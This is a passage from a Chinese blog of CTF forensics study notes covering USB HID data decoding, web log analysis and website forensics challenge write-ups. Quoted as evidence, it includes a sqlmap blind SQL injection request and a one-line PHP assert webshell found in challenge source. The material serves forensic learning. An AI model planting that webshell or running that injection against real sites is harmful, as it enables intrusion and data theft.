class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;output :&#x27;</span> + <span class="string">&quot;&quot;</span>.join(output))</span><br></pre></td></tr></table></figure><p>得到最终的flag</p><p><img src="https://haslet007.github.io/img/image-20241014180413585.png" alt="image-20241014180413585"></p><h3 id="HID数据字段内容提取"><a href="#HID数据字段内容提取" class="headerlink" title="HID数据字段内容提取"></a>HID数据字段内容提取</h3><p><strong>HID（Human Interface Device）数据字段</strong>通常存储的是来自<strong>USB键盘、鼠标、游戏手柄</strong>等输入设备的数据。在解析<code>usbhid.data</code>字段时，可以提取到以下类型的内容：</p><p>​1. 键盘数据  </p><ul><li><strong>键值（Keycodes）</strong>：表示按下的键。键值使用标准的<strong>HID使用表（HID Usage Table）</strong>编码，如键盘字母键、功能键等。<ul><li>例如，<code>04</code> 表示字母 <strong>‘a’</strong>，<code>05</code> 表示 <strong>‘b’</strong>。</li></ul></li><li><strong>修饰符（Modifiers）</strong>：如 <code>Shift</code>、<code>Ctrl</code>、<code>Alt</code>，它们通过单独的字节位表示。<ul><li>例如，<code>02</code> 表示 <strong>左Shift</strong>，<code>01</code> 表示 <strong>左Ctrl</strong>。</li></ul></li><li><strong>按键状态</strong>：<ul><li>0 表示未按下，1 表示按下。</li></ul></li></ul><p><strong>示例数据</strong>：<code>02 00 04 00 00 00 00 00</code></p><ul><li><strong>02</strong>：左Shift按下  </li><li><strong>04</strong>：‘a’键按下  </li><li>其他为 0 的字节表示没有其他按键活动。</li></ul><ol start="2"><li>鼠标数据</li></ol><ul><li><strong>按键状态</strong>：鼠标的左键、右键、中键状态。<ul><li>例如，<code>01</code> 表示左键按下，<code>02</code> 表示右键按下。</li></ul></li><li><strong>X、Y坐标偏移</strong>：表示鼠标在X轴和Y轴的移动量。<ul><li><strong>正值</strong>表示向右&#x2F;向下移动，<strong>负值</strong>表示向左&#x2F;向上移动。</li></ul></li><li><strong>滚轮滚动</strong>：滚轮的滚动方向和步数。</li></ul><p><strong>示例数据</strong>：<code>01 05 FF 00 01</code></p><ul><li><strong>01</strong>：左键按下  </li><li><strong>05</strong>：X轴移动5个单位  </li><li><strong>FF</strong>：Y轴向上移动（-1）  </li><li><strong>01</strong>：滚轮向前滚动1步</li></ul><ol start="3"><li>游戏手柄数据</li></ol><ul><li><strong>按钮状态</strong>：手柄按键的状态（如 A&#x2F;B&#x2F;X&#x2F;Y、肩键）。</li><li><strong>摇杆数据</strong>：表示摇杆的X&#x2F;Y轴位置，通常范围为 0-255。</li><li><strong>扳机键数据</strong>：表示扳机按压的深度，通常范围也在 0-255。</li></ul><p><strong>示例数据</strong>：<code>01 80 80 10 00</code></p><ul><li><strong>01</strong>：按键A被按下  </li><li><strong>80 80</strong>：摇杆处于中心位置  </li><li><strong>10</strong>：右肩键按下</li></ul><ol start="4"><li>组合输入序列</li></ol><p>在一些USB键盘或宏设备中，可能会传递<strong>多键同时按下</strong>的组合。通过解析这些组合，可以提取到复杂输入序列，甚至在CTF比赛中找到<strong>特定的Flag输入序列</strong>。</p><ol start="5"><li>其他设备的状态信息</li></ol><ul><li>某些HID设备，如条码扫描器或触控板，也会通过<code>usbhid.data</code>传递数据。</li><li>例如，扫描器会将条码数据编码在HID数据包中。</li></ul><hr><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过提取<code>usbhid.data</code>字段，可以了解USB设备的<strong>按键、鼠标移动、按钮状态</strong>等输入信息。在CTF场景中，分析这些数据有助于发现<strong>按键序列或Flag</strong>。解析这些数据通常需要对HID协议的使用表熟悉，并将其转译为人类可读的内容。</p><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><h3 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h3><p>在 CTF 比赛中，日志分析是一个重要的技能，能够帮助团队识别和响应安全事件。以下是 CTF 日志分析的概述：</p><ol><li><strong>日志来源</strong></li></ol><ul><li><strong>网络日志</strong>：记录网络流量，包括入站和出站的数据包，通常来自防火墙、路由器和 IDS&#x2F;IPS 系统。</li><li><strong>主机日志</strong>：来自操作系统和应用程序的日志，记录系统事件、用户活动和应用程序行为。</li><li><strong>安全日志</strong>：记录与安全相关的事件，如用户登录、权限更改、文件访问等。</li><li><strong>审计日志</strong>：用于追踪系统或应用程序的特定活动，常用于合规性检查。</li></ul><ol start="2"><li><strong>日志分析的目标</strong></li></ol><ul><li><strong>事件检测</strong>：识别异常活动，例如未授权访问、恶意软件感染或其他安全事件。</li><li><strong>取证分析</strong>：在发生安全事件后，通过分析日志重建事件的发生过程。</li><li><strong>行为分析</strong>：了解用户和系统的正常行为，帮助检测不寻常的活动。</li><li><strong>攻击溯源</strong>：追踪攻击者的行为，识别其使用的工具、技术和攻击路径。</li></ul><ol start="3"><li><strong>日志分析工具</strong></li></ol><ul><li><strong>ELK Stack</strong>：包括 Elasticsearch、Logstash 和 Kibana，用于集中管理和分析日志数据。</li><li><strong>Splunk</strong>：一个强大的日志分析平台，用于实时搜索、监控和分析。</li><li><strong>Wireshark</strong>：网络协议分析工具，用于捕获和分析网络流量。</li><li><strong>Sysinternals</strong>：Windows 平台下的一系列工具，适合进行深入的系统分析。</li></ul><ol start="4"><li><strong>分析方法</strong></li></ol><ul><li><strong>模式识别</strong>：识别日志中的特定模式或行为，这可以通过设置基线来完成。</li><li><strong>异常检测</strong>：比较当前日志与历史数据，寻找不符合预期的行为。</li><li><strong>时间序列分析</strong>：分析日志中的时间戳，识别事件的顺序和持续时间。</li><li><strong>关联分析</strong>：将不同日志来源的数据结合在一起，识别跨系统的安全事件。</li></ul><ol start="5"><li><p><strong>典型分析步骤</strong></p></li><li><p><strong>收集数据</strong>：从各个来源收集日志数据。</p></li><li><p><strong>预处理数据</strong>：清理和标准化日志，去除冗余信息。</p></li><li><p><strong>定义规则</strong>：根据常见攻击手法（如 SQL 注入、XSS、缓冲区溢出等）定义检测规则。</p></li><li><p><strong>进行分析</strong>：使用工具或手动分析日志，寻找可疑活动。</p></li><li><p><strong>报告和响应</strong>：将分析结果记录在案，并根据发现采取适当的响应措施。</p></li></ol><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="陇剑杯-2021-日志分析（问1）"><a href="#陇剑杯-2021-日志分析（问1）" class="headerlink" title="[陇剑杯 2021]日志分析（问1）"></a>[陇剑杯 2021]日志分析（问1）</h4><p>题目描述：单位某应用程序被攻击，请分析日志，进行作答：<br>网络存在源码泄漏，源码文件名是_____________。(请提交带有文件后缀的文件名，例如x.txt)。得到的flag请使用NSSCTF{}格式提交。</p><p>题目给出access.log日志文件，使用记事本打开查看内容。具体分析出现的问题是源码泄露，所以猜测服务器是正常返回，于是先筛选一部分流量包，搜索<code>200</code>字样（200表示服务器正常提供服务正常返回数据）。</p><p><img src="https://haslet007.github.io/img/image-20240926214145908.png" alt="image-20240926214145908"></p><p>搜索到zip文件表示攻击者正常获取到这个zip文件，经过url解码后GET参数后面是<code>www.zip</code>，得到flag</p><h4 id="陇剑杯-2021-日志分析（问2）"><a href="#陇剑杯-2021-日志分析（问2）" class="headerlink" title="[陇剑杯 2021]日志分析（问2）"></a>[陇剑杯 2021]日志分析（问2）</h4><p>题目描述：单位某应用程序被攻击，请分析日志，进行作答：<br>分析攻击流量，黑客往&#x2F;tmp目录写入一个文件，文件名为_____________。得到的flag请使用NSSCTF{}格式提交。</p><p>根据题目所给的思路，先搜索<code>tmp</code>字样。</p><p><img src="https://haslet007.github.io/img/image-20240926214744259.png" alt="image-20240926214744259"></p><p>发现可疑的攻击行为</p><p>攻击行为可以简述为以下几点：</p><ol><li><strong>路径遍历攻击</strong>:<ul><li>攻击者通过在请求中使用 <code>../../</code> 的方式，试图访问服务器文件系统中的敏感目录和文件（ <code>/tmp/sess_car</code>）。</li></ul></li><li><strong>文件上传尝试</strong>:<ul><li>攻击者尝试将恶意文件上传至服务器，使用了特定的参数（如 <code>filename</code> 和 <code>content</code>），以操控服务器的文件处理机制。</li></ul></li><li><strong>利用序列化数据</strong>:<ul><li>请求中包含序列化数据，可能用于调用恶意函数或方法，尝试执行不当的操作（例如，读取敏感文件或执行代码）。</li></ul></li><li><strong>自动化请求</strong>:<ul><li>所有请求都来自同一 IP 地址，并使用相同的用户代理（<code>python-requests</code>），表明攻击者使用脚本自动化执行攻击。</li></ul></li><li><strong>重定向</strong>:<ul><li>服务器返回 <code>302</code> 状态码，可能表明对敏感资源的访问进行了重定向，可能是为了保护资源或处理上传文件的流程。</li></ul></li></ol><p>此题flag即<code>sess_car</code></p><h4 id="陇剑杯-2021-日志分析（问3）"><a href="#陇剑杯-2021-日志分析（问3）" class="headerlink" title="[陇剑杯 2021]日志分析（问3）"></a>[陇剑杯 2021]日志分析（问3）</h4><p>题目描述：单位某应用程序被攻击，请分析日志，进行作答：<br>分析攻击流量，黑客使用的是______类读取了秘密文件。得到的flag请使用NSSCTF{}格式提交。</p><p>题目中提到的“类”通常是指编程中的一个结构，它是面向对象编程（OOP）中的核心概念之一。类是一种模板或蓝图，用于创建对象（实例）。类定义了对象的属性（变量）和行为（方法）。通过使用类，开发者可以定义数据结构和操作这些数据的方式。</p><p>在攻击场景中，可能提到的“类”是指黑客使用的某种编程语言中的类，用来实现特定的功能，比如读取文件的类。常见的类可以是：</p><ol><li><strong>文件处理类</strong>：比如在Java中可以使用 <code>FileReader</code> 类来读取文件内容，在Python中则有 <code>open()</code> 函数结合 <code>file</code> 对象来读取文件。</li><li><strong>网络请求类</strong>：可能用于发起恶意请求来窃取数据。</li><li><strong>操作系统类</strong>：可能是用来执行系统命令的类，比如Python的 <code>os</code> 模块中的类可以调用底层操作系统的命令。</li></ol><p>因此，黑客可能使用某种编程语言中的某个类来读取秘密文件，而这个类的具体名称取决于黑客使用的编程语言和攻击方式。</p><p>在本题中，找到文件上传的点</p><p><img src="https://haslet007.github.io/img/image-20241015112535922.png" alt="image-20241015112535922"></p><p>随波逐流进行url解码<img src="https://haslet007.github.io/img/image-20241015112626631.png" alt="image-20241015112626631">得到flag</p><h4 id="闽盾杯-2021-日志分析"><a href="#闽盾杯-2021-日志分析" class="headerlink" title="[闽盾杯 2021]日志分析"></a>[闽盾杯 2021]日志分析</h4><p>题目描述：flag 为 password 字段值, 得到的flag请使用NSSCTF{}格式提交</p><p>打开<code>access.log</code>文件发现是一个标准的SQL注入日志，题目要求寻找password的字段值</p><p>分析这段日志</p><p><code>213.54.123.103 - - [21/Nov/2021:19:36:15 +0000] &quot;GET /api/forum.php/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28password%20AS%20NCHAR%29%2C0x20%29%20FROM%20security.users%20ORDER%20BY%20id%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E64%20AND%20%27bZxu%27%3D%27bZxu HTTP/1.1&quot; 200 675 &quot;-&quot; &quot;sqlmap/1.5.5.1#dev (http://sqlmap.org)&quot;</code></p><p>URL解码后为</p><p><code>id=1&#39; AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM security.users ORDER BY id LIMIT 0,1),1,1)) &gt; 64 AND &#39;bZxu&#39;=&#39;bZxu</code>，发现攻击者尝试使用 <strong>基于布尔盲注</strong> 的方法来获取密码的字符Q</p><h3 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h3><p><code>SplFileObject</code> 是 PHP 标准库中的一个类，用于简化文件操作，支持<strong>读取、写入、逐行读取、文件指针控制</strong>以及<strong>CSV 文件处理</strong>。</p><p><strong>核心功能：</strong></p><ol><li><strong>文件读取与写入</strong>：支持多种模式操作文件（如只读、写入）。</li><li><strong>逐行读取</strong>：按行读取，适合处理大文件。</li><li><strong>文件指针控制</strong>：支持获取和移动文件指针位置。</li><li><strong>CSV 支持</strong>：自动解析和生成 CSV 数据。</li><li><strong>迭代器支持</strong>：可用 <code>foreach</code> 遍历文件内容。</li></ol><p><strong>示例：逐行读取文件</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&quot;example.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$file</span> <span class="keyword">as</span> <span class="variable">$line</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$line</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该类使文件操作更加高效和简洁，特别适用于需要频繁读取和处理大文件的场景。</p><h2 id="网站取证"><a href="#网站取证" class="headerlink" title="网站取证"></a>网站取证</h2><h3 id="概述-3"><a href="#概述-3" class="headerlink" title="概述"></a>概述</h3><p>CTF 中的<strong>网站取证</strong>（Web Forensics）通常涉及从网站的文件、数据库、请求响应记录等信息中提取有价值的数据，用于解密、溯源、或找出隐藏的 flag。任务主要考察参赛者分析网站文件、源码、Cookie、日志、缓存等的能力。</p><ol><li><strong>常见取证场景与解法</strong></li></ol><p>1.1. <strong>日志分析</strong></p><ul><li><strong>题目提示</strong>：访问日志（<code>access.log</code>）、错误日志（<code>error.log</code>）等文件给出，需要寻找某个请求中的 flag 或入侵者的访问记录。</li><li><strong>解法</strong>：<ol><li>关注<code>GET</code>和<code>POST</code>请求，尤其是带参数的请求（例如 SQL 注入、XSS 攻击）。</li><li>查看请求是否包含异常字段（如 Payload）。</li><li>使用正则表达式快速提取可疑的 IP、参数，寻找可能的 flag。</li></ol></li></ul><p>​<strong>示例</strong>：<code>grep -E &quot;flag|/admin&quot; access.log</code></p><p>1.2. <strong>源码分析</strong></p><ul><li><p><strong>题目提示</strong>：提供网站源码（如 PHP、JS 文件）。flag 可能以<strong>注释</strong>形式存在，或埋藏在逻辑漏洞中。</p></li><li><p><strong>解法</strong>：</p><ol><li>查找源码注释 (<code>&lt;!-- --&gt;</code>、<code>//</code> 等)。</li><li>查看敏感文件（如 <code>.env</code> 文件），可能泄露密钥或密码。</li><li>如果是数据库连接代码，检查 SQL 查询语句是否返回了 flag。</li></ol><p><strong>示例</strong>：<br>查找 PHP 文件中的注释：<code>grep -r &quot;//&quot; *.php</code></p></li></ul><p>1.3. <strong>Cookie 和 Session 分析</strong></p><ul><li><p><strong>题目提示</strong>：通过 Cookie 存储敏感信息或登录凭证。</p></li><li><p><strong>解法</strong>：</p><ol><li>查看 Cookie 是否经过简单编码（如 base64）。</li><li>分析 Cookie 的逻辑，尝试伪造或修改关键字段，绕过权限控制。</li></ol><p><strong>示例</strong>：<br>解码 Cookie：<code>echo &quot;c29tZV9kYXRhCg==&quot; | base64 -d</code></p></li></ul><p>1.4. <strong>缓存文件取证</strong></p><ul><li><p><strong>题目提示</strong>：提供缓存目录（如 <code>.DS_Store</code>、<code>__MACOSX</code>），flag 可能藏在缓存文件中。</p></li><li><p><strong>解法</strong>：</p><ol><li>使用 <code>strings</code> 提取文件中的可读信息。</li><li>分析 <code>.DS_Store</code> 文件结构，查看隐藏的文件路径。</li></ol><p><strong>示例</strong>：<br>使用 <code>strings</code> 命令分析文件：<code>strings cache.bin | grep &quot;flag&quot;</code></p></li></ul><p>1.5. <strong>图片隐写与文件分析</strong></p><ul><li><p><strong>题目提示</strong>：在网站中提供图片或文件，flag 被藏在元数据或隐写信息中。</p></li><li><p><strong>解法</strong>：</p><ol><li>使用<code>exiftool</code>查看图片的元数据，或尝试<code>binwalk</code>提取文件隐藏内容。</li><li>使用<code>steghide</code>查看图片是否包含隐藏数据。</li></ol><p><strong>示例</strong>：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exiftool image.jpg</span><br><span class="line">binwalk -e image.jpg</span><br></pre></td></tr></table></figure><h3 id="蓝帽杯-2022-初赛-网站取证-1"><a href="#蓝帽杯-2022-初赛-网站取证-1" class="headerlink" title="[蓝帽杯 2022 初赛]网站取证_1"></a>[蓝帽杯 2022 初赛]网站取证_1</h3><p>题目描述：据了解，某网上商城系一团伙日常资金往来用，从2022年4月1日起使用虚拟币GG币进行交易，现已获得该网站的源代码以及部分数据库备份文件，请您对以下问题进行分析解答。</p><p>请从网站源码中找出木马文件，并提交木马连接的密码。得到的flag请使用NSSCTF{}形式提交</p><p>下载附件简单查看一番，可以手动查找木马病毒不过效率比较慢，可以使用工具D盾一键扫描目录病毒</p><p><img src="https://haslet007.github.io/img/image-20241021200604355.png" alt="image-20241021200604355"></p><p>找到后门病毒即得出本题flag</p><p><code>&lt;?php assert(@$_POST[&#39;lanmaobei666&#39;]); ?&gt;</code></p><h3 id="蓝帽杯-2022-初赛-网站取证-2"><a href="#蓝帽杯-2022-初赛-网站取证-2" class="headerlink" title="[蓝帽杯 2022 初赛]网站取证_2"></a>[蓝帽杯 2022 初赛]网站取证_2</h3><p>题目描述：据了解，某网上商城系一团伙日常资金往来用，从2022年4月1日起使用虚拟币GG币进行交易，现已获得该网站的源代码以及部分数据库备份文件，请您对以下问题进行分析解答。</p><p>请提交数据库连接的明文密码，得到的flag请使用NSSCTF{}形式提交。</p><p>本题要求找到数据库连接的明文密码，所以解题思路在于找到相关的php文件，例如database等字样。</p><p>使用<code>Everything</code>工具进行快速搜索</p><p>![image-20241021201735923]<a href="https://haslet007.github.io/img/image-20241021201735923.png">https://haslet007.github.io\img\image-20241021201735923.png</a>)</p><p>在<code>WWW/application</code>目录下发现<code>database.php</code>文件</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&lt;</span>?php</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> <span class="operator">+</span><span class="comment">----------------------------------------------------------------------</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> <span class="operator">|</span> ThinkPHP [ WE CAN DO IT JUST THINK ]</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> <span class="operator">+</span><span class="comment">----------------------------------------------------------------------</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> <span class="operator">|</span> Copyright (c) <span class="number">2006</span><span class="operator">~</span><span class="number">2016</span> http:<span class="operator">/</span><span class="operator">/</span>thinkphp.cn <span class="keyword">All</span> rights reserved.</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> <span class="operator">+</span><span class="comment">----------------------------------------------------------------------</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> <span class="operator">|</span> Licensed ( http:<span class="operator">/</span><span class="operator">/</span>www.apache.org<span class="operator">/</span>licenses<span class="operator">/</span>LICENSE<span class="number">-2.0</span> )</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> <span class="operator">+</span><span class="comment">----------------------------------------------------------------------</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> <span class="operator">|</span> Author: liu21st <span class="operator">&lt;</span>liu21st<span class="variable">@gmail</span>.com<span class="operator">&gt;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> <span class="operator">+</span><span class="comment">----------------------------------------------------------------------</span></span><br><span class="line">include (&quot;encrypt/encrypt.php&quot;);</span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="operator">/</span><span class="operator">/</span> 数据库类型</span><br><span class="line">    <span class="string">&#x27;type&#x27;</span>            <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;pgsql&#x27;</span>,</span><br><span class="line">    <span class="operator">/</span><span class="operator">/</span> 服务器地址</span><br><span class="line">    <span class="string">&#x27;hostname&#x27;</span>        <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="operator">/</span><span class="operator">/</span> 数据库名</span><br><span class="line">    <span class="string">&#x27;database&#x27;</span>        <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;store&#x27;</span>,</span><br><span class="line">    <span class="operator">/</span><span class="operator">/</span> 用户名</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>        <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;postgres&#x27;</span>,</span><br><span class="line">    <span class="operator">/</span><span class="operator">/</span> 密码</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>        <span class="operator">=</span><span class="operator">&gt;</span> my_encrypt(),</span><br><span class="line">    <span class="operator">/</span><span class="operator">/</span> 端口</span><br><span class="line">    <span class="string">&#x27;hostport&#x27;</span>        <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;5432&#x27;</span>,</span><br><span class="line">    <span class="operator">/</span><span class="operator">/</span> 连接dsn</span><br><span class="line">    <span class="string">&#x27;dsn&#x27;</span>             <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="operator">/</span><span class="operator">/</span> 数据库连接参数</span><br><span class="line">    <span class="string">&#x27;params&#x27;</span>          <span class="operator">=</span><span class="operator">&gt;</span> [],</span><br><span class="line">    <span class="operator">/</span><span class="operator">/</span> 数据库编码默认采用utf8</span><br><span class="line">    <span class="string">&#x27;charset&#x27;</span>         <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;utf8&#x27;</span>,</span><br><span class="line">    <span class="operator">/</span><span class="operator">/</span> 数据库表前缀</span><br><span class="line">    <span class="string">&#x27;prefix&#x27;</span>          <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="operator">/</span><span class="operator">/</span> 数据库调试模式</span><br><span class="line">    <span class="string">&#x27;debug&#x27;</span>           <span class="operator">=</span><span class="operator">&gt;</span> <span class="literal">true</span>,</span><br><span class="line">    <span class="operator">/</span><span class="operator">/</span> 数据库部署方式:<span class="number">0</span> 集中式(单一服务器),<span class="number">1</span> 分布式(主从服务器)</span><br><span class="line">    <span class="string">&#x27;deploy&#x27;</span>          <span class="operator">=</span><span class="operator">&gt;</span> <span class="number">0</span>,</span><br><span class="line">    <span class="operator">/</span><span class="operator">/</span> 数据库读写是否分离 主从式有效</span><br><span class="line">    <span class="string">&#x27;rw_separate&#x27;</span>     <span class="operator">=</span><span class="operator">&gt;</span> <span class="literal">false</span>,</span><br><span class="line">    <span class="operator">/</span><span class="operator">/</span> 读写分离后 主服务器数量</span><br><span class="line">    <span class="string">&#x27;master_num&#x27;</span>      <span class="operator">=</span><span class="operator">&gt;</span> <span class="number">1</span>,</span><br><span class="line">    <span class="operator">/</span><span class="operator">/</span> 指定从服务器序号</span><br><span class="line">    <span class="string">&#x27;slave_no&#x27;</span>        <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="operator">/</span><span class="operator">/</span> 是否严格检查字段是否存在</span><br><span class="line">    <span class="string">&#x27;fields_strict&#x27;</span>   <span class="operator">=</span><span class="operator">&gt;</span> <span class="literal">true</span>,</span><br><span class="line">    <span class="operator">/</span><span class="operator">/</span> 数据集返回类型</span><br><span class="line">    <span class="string">&#x27;resultset_type&#x27;</span>  <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;array&#x27;</span>,</span><br><span class="line">    <span class="operator">/</span><span class="operator">/</span> 自动写入时间戳字段</span><br><span class="line">    <span class="string">&#x27;auto_timestamp&#x27;</span>  <span class="operator">=</span><span class="operator">&gt;</span> <span class="literal">false</span>,</span><br><span class="line">    <span class="operator">/</span><span class="operator">/</span> 时间字段取出后的默认时间格式</span><br><span class="line">    <span class="string">&#x27;datetime_format&#x27;</span> <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;Y-m-d H:i:s&#x27;</span>,</span><br><span class="line">    <span class="operator">/</span><span class="operator">/</span> 是否需要进行<span class="keyword">SQL</span>性能分析</span><br><span class="line">    <span class="string">&#x27;sql_explain&#x27;</span>     <span class="operator">=</span><span class="operator">&gt;</span> <span class="literal">false</span>,</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>发现服务器连接密码<code>my_encrypt()</code>，但是是错误的，又发现文件头包含了另一个php文件<code>include (&quot;encrypt/encrypt.php&quot;);</code>，继续寻找</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">my_encrypt</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&#x27;P3LMJ4uCbkFJ/RarywrCvA==&#x27;</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;/r/n&quot;</span>, <span class="string">&quot;/r&quot;</span>, <span class="string">&quot;/n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&#x27;PanGuShi&#x27;</span>;</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$key</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">    <span class="variable">$td</span> = <span class="title function_ invoke__">mcrypt_module_open</span>(MCRYPT_RIJNDAEL_128,<span class="string">&quot;&quot;</span>,MCRYPT_MODE_CBC,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mcrypt_generic_init</span>(<span class="variable">$td</span>, <span class="string">&quot;PanGuShi&quot;</span>, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="variable">$decode</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$dencrypted</span> = <span class="title function_ invoke__">mdecrypt_generic</span>(<span class="variable">$td</span>, <span class="variable">$decode</span>);</span><br><span class="line">    <span class="title function_ invoke__">mcrypt_generic_deinit</span>(<span class="variable">$td</span>);</span><br><span class="line">    <span class="title function_ invoke__">mcrypt_module_close</span>(<span class="variable">$td</span>);</span><br><span class="line">    <span class="variable">$dencrypted</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$dencrypted</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$dencrypted</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码的目标是通过 <strong>AES-128-CBC</strong> 方式解密一个base64编码的字符串。</p><p>通过在程序末尾添加打印语句<code>echo my_encrypt()</code>即可打印出最终flag<code>KBLT123</code></p><p><img src="https://haslet007.github.io/img/image-20241021203134216.png" alt="image-20241021203134216"></p><h3 id="蓝帽杯-2022-初赛-网站取证-3"><a href="#蓝帽杯-2022-初赛-网站取证-3" class="headerlink" title="[蓝帽杯 2022 初赛]网站取证_3"></a>[蓝帽杯 2022 初赛]网站取证_3</h3><p>题目描述：请提交数据库金额加密混淆使用的盐值。<br>得到的flag请使用NSSCTF{}形式提交</p><p>在网站目录中找到交易订单控制器文件<code>Channelorder.php</code></p><p><img src="https://haslet007.github.io/img/image-20241022115247654.png" alt="image-20241022115247654"></p><p>找到盐值</p><h3 id="鹏城杯-2022-简单取证"><a href="#鹏城杯-2022-简单取证" class="headerlink" title="[鹏城杯 2022]简单取证"></a>[鹏城杯 2022]简单取证</h3><p>首先将下载的压缩包解压，发现存在file.raw文件</p><p><img src="https://haslet007.github.io/img/image-20241022115807613.png" alt="image-20241022115807613"></p><p>使用镜像分析工具<code>volalitily</code>获取照片详细信息</p><p><code>python vol.py -f C:\Users\Haslet\Downloads\file.raw windows.info.Info</code></p><h3 id="盐值"><a href="#盐值" class="headerlink" title="盐值"></a>盐值</h3><p>盐值（salt）是随机生成的字符串，用于增强密码存储的安全性。它与用户的密码结合后，生成哈希值。即使两个用户的密码相同，因盐值不同，生成的哈希值也会不同，从而防止彩虹表攻击。</p><h2 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h2><h3 id="概述-4"><a href="#概述-4" class="headerlink" title="概述"></a>概述</h3><p><strong>一、什么是内存取证</strong></p><ul><li>内存取证是从计算机内存中提取和分析数据的过程。在 CTF（Capture The 